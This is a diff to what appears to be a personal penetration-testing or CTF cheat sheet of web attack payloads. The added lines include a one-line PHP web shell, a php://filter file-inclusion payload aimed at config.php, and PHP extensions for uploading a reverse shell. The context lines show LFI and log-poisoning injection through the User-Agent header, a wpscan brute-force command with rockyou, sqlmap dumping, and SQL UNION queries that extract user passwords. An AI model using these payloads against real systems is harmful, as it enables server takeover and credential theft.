@@ -43,13 +43,28 @@ wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ]>
 ```
 ---
+# php rce
+```
+<?php echo "$ ";system($_GET['cmd']); ?>
+```
 # php local file inclusion
 ```
 http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
 
+?inc=php://filter/read=convert.base64-encode/resource=config.php
+
 curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
+```
+---
+# php extensions to run revsell
+```
+.php
+.php3
+.php4
+.php5
+.phtml
 ```
 ---
 # Cadaver for WebDAV
@@ -62,8 +77,8 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 # sql
 ## sqlmap
 ```bash
-sqlmap -r req.txt -p <parametr> --dbs
-sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
+sqlmap -r req.txt --dbs
+sqlmap -r req.txt -D <database_name> --tables
 sqlmap -r req.txt -D <database_name> -T <table_name> --columns
 sqlmap -r req.txt-p  -D <database_name> --dump-all
 ```
@@ -149,6 +164,11 @@ get users and passwords:
 ```sql
 UNION SELECT 1,group_concat(username,':',password),3,4 FROM website.users -- - 
 ```
+## sqlite
+get tables:
+```sql
+union select null,tbl_name FROM sqlite_master
+```
 ## postgres
 list of tables in the database:
 ```sql
@@ -162,8 +182,6 @@ retrieve the usernames and passwords for all users:
 ```sql
 UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
-## oracle
-
 ---
 # ssti
 ```python
